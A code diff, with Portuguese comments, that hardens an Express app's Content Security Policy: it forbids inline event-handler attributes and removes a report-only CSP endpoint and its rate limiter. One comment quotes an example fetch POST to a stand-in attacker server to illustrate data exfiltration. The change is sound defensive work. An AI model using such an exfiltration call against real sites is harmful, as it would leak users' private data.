@@ -139,8 +139,7 @@ const { obterHashes } = require('./utils/cspHashes');
 // com nenhum hash e não executa. Como a política passa a conter hashes, o
 // browser ignora `'unsafe-inline'` mesmo se alguém o reintroduzir por engano.
 //
-// Restam os handlers inline (`onclick=`), cobertos por `script-src-attr` —
-// diretiva separada, endurecida abaixo.
+// Atributo de evento (`onclick=`) não roda: `script-src-attr 'none'`, abaixo.
 // ============================================
 app.use(
     helmet({
@@ -161,11 +160,12 @@ app.use(
                     ],
                     () => obterHashes(frontendRootPath).join(' '),
                 ],
-                // Handlers inline (onclick=...) do HTML legado. Continua sendo uma
-                // exceção, mas MUITO mais estreita que a anterior: vale só para
-                // atributos de evento, nunca para blocos <script>. Fechar isto de
-                // vez exige reescrever os ~174 handlers como addEventListener.
-                'script-src-attr': ["'unsafe-inline'"],
+                // Nenhum atributo de evento (onclick=, onerror=...) executa. O
+                // épico #612 trocou os handlers inline do frontend por
+                // `data-acao` (js/acoes.js) e addEventListener; HTML injetado que
+                // escape do `escapeHtml` não vira mais script por um atributo.
+                // A trava `handlersInline.trava.test.js` reprova handler novo.
+                'script-src-attr': ["'none'"],
                 'style-src': [
                     "'self'",
                     "'unsafe-inline'",
@@ -192,8 +192,7 @@ app.use(
                 // ============================================
                 // A lista terminava em `https: http: ws: wss:`, que autoriza QUALQUER
                 // host. Isso reabre justamente o que o resto da CSP fecha: um script
-                // que consiga executar (via `script-src-attr: 'unsafe-inline'`, ainda
-                // aberto para os ~174 handlers legados) podia fazer
+                // que consiga executar podia fazer
                 // `fetch('https://servidor-do-atacante/', {method:'POST', body: ...})`
                 // e drenar nota, frequência e dado de menor sem obstáculo nenhum.
                 // A CSP só vira barreira de EXFILTRAÇÃO quando o destino é enumerado.
@@ -254,12 +253,6 @@ app.use(
         crossOriginEmbedderPolicy: false, // Desabilitado para compatibilidade com CDNs
     })
 );
-
-// A mesma CSP sem handler inline, só em modo relatório (Issue #613, épico
-// #612): o navegador não bloqueia nada e avisa em POST /api/csp-relatorio cada
-// `onclick=` que a política nova barraria. Ver middleware/cspRelatorio.js.
-const cspRelatorio = require('./middleware/cspRelatorio');
-app.use(cspRelatorio.politicaEmRelatorio);
 
 // Cabeçalhos anti-clickjacking também nas respostas de arquivo estático e nas
 // páginas de erro, que em alguns caminhos não passam pela cadeia acima.
@@ -396,7 +389,6 @@ const {
     codeIpLimiter,
     codeContaLimiter,
     authPrefixLimiter,
-    cspRelatorioLimiter,
 } = require('./middleware/rateLimiters');
 
 // ============================================
@@ -633,9 +625,6 @@ function removerOperadoresMongo(alvo) {
 // ============================================
 // 1. Define o cookie CSRF em toda resposta
 app.use(csrfCookieSetter);
-// Relatório de violação da CSP (Issue #613): o navegador manda sozinho, sem
-// token CSRF — por isso fica antes do validador, com teto próprio por IP.
-app.post(cspRelatorio.ROTA, cspRelatorioLimiter, ...cspRelatorio.receberRelatorioCsp);
 // POST /api/observability/frontend-error — coletor de erros do navegador.
 // O front não fala com o Sentry direto por causa da CSP; ver middleware.js.
 // Antes do validador pelo mesmo motivo do relatório de CSP (Issue #715): o
